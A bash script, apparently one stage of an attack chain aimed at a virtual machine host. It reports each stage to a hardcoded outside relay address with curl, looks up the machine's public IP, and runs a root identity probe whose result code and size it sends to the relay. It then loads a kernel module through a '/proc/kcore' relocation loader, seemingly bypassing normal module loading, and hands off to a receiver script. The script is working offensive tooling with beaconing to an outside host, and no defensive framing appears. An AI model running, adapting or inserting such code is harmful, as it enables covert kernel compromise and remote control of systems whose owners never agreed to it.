#!/bin/bash
set +e
relay=http://16.146.243.72:8450

run=$(cat /tmp/vmbfs-b-run 2>/dev/null)
slot=$(cat /tmp/vmbfs-b-slot 2>/dev/null)
curl -fsS "$relay/VMBFS_B_STAGE?run=$run&slot=$slot&stage=root-begin" \
  >/dev/null 2>&1 || true
curl -fsS https://api.ipify.org -o /tmp/receiver-public-ip 2>/dev/null || \
  printf unknown >/tmp/receiver-public-ip
python3 /tmp/root_identity_probe.py >/tmp/root-identity.json 2>/tmp/root-identity.err
identity_rc=$?
identity_bytes=$(wc -c </tmp/root-identity.json 2>/dev/null)
curl -fsS "$relay/VMBFS_B_STAGE?run=$run&slot=$slot&stage=identity-$identity_rc-$identity_bytes" \
  >/dev/null 2>&1 || true

python3 /tmp/kcore_relid_load.py /tmp/hvraw_vmbfs_observer.ko 0 \
  class:c376c1c3-d276-48d2-90a9-c04748072c60 0
load_rc=$?
curl -fsS "$relay/VMBFS_B_STAGE?run=$run&slot=$slot&stage=load-$load_rc" \
  >/dev/null 2>&1 || true

if ! test -r /hostsys/module/hvraw_vmbfs_observer/parameters/result; then
  curl -fsS "$relay/VMBFS_B_STAGE?run=$run&slot=$slot&stage=params-missing" \
    >/dev/null 2>&1 || true
  printf 'VMBFS_RECEIVER_PARAMS missing\n'
  exit 30
fi
curl -fsS "$relay/VMBFS_B_STAGE?run=$run&slot=$slot&stage=params-ready" \
  >/dev/null 2>&1 || true
exec python3 -u /tmp/vmbfs_receiver.py "$run" "$slot"
